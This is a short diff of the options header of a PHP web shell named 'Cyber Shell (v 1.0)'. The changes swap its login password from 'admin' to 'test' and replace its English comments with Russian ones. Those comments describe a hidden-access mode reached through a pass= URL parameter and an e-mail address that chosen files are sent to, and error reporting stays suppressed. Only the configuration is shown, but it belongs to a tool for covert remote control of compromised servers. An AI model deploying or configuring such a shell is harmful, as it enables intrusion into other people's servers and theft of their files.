@@ -1,5 +1,4 @@
-<?php
-error_reporting(0);
+<?
 /***************************************************************************
  *                           Cyber Shell (v 1.0)
  *                            -------------------
@@ -25,11 +24,11 @@ error_reporting(0);
 @set_magic_quotes_runtime(0);
 @error_reporting(0);
 /****************************** Options ************************************/
-// password for login 
-$aupassword="admin";
-//
+#пароль на авторизацию 
+$aupassword="test";
+#если пароль установлен при $hiddenmode="true", то к скрипту нужно обращаться с параметром pass=пароль , например shell.php?pass=mysecretpass
 $hiddenmode="false";
-#e-mail
+#e-mail на который скидываются выбранные файлы
 $email="test@mail.ru";
 /***************************************************************************/
 $style="
